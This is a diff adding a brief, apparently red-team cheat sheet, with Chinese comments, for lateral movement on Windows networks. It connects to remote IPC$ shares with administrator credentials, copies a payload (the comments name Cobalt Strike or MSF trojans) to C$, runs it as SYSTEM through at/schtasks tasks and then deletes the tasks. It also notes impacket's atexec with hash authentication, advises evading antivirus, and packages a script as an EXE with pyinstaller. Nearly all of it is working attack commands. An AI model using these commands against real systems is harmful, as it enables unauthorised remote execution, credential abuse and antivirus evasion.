@@ -1,0 +1,21 @@
+#schtask < Windows2012
+net use \\192.168.3.21\ipc$ "Admin12345" /user:god.org\administrator #建立IPC连接:
+copy add.bat \\192.168.3.21\c$ #拷⻉执行文件到目标机器(实战中大多是CS或者MSF木⻢)
+at \\192.168.3.21 15:47 c:\add.bat #添加计划任务
+
+
+
+
+#schtask >=Windows2012
+net use \\192.168.3.32\ipc$ "admin!@#45" /user:god.org\administrator #建立ipc连接
+copy add.bat \\192.168.3.32\c$
+schtasks /create /s 192.168.3.32 /ru "SYSTEM" /tn adduser /sc DAILY
+/tr c:\add.bat /F #创建adduser任务对应执行文件
+schtasks /run /s 192.168.3.32 /tn adduser /i #运行adduser任务
+schtasks /delete /s 192.168.3.32 /tn adduser /f #删除adduser任务
+
+atexec-impacket工具 支持哈希密码
+优点:方便快捷,可以支持hash。缺点:第三方工具,会受到杀毒软件或防护的影响。如果目标主机有杀软或防护的话,要对该软件进行免杀
+
+#pip install pyinstaller
+#pyinstaller -F fuck_neiwang_001.py 生成可执行EXE
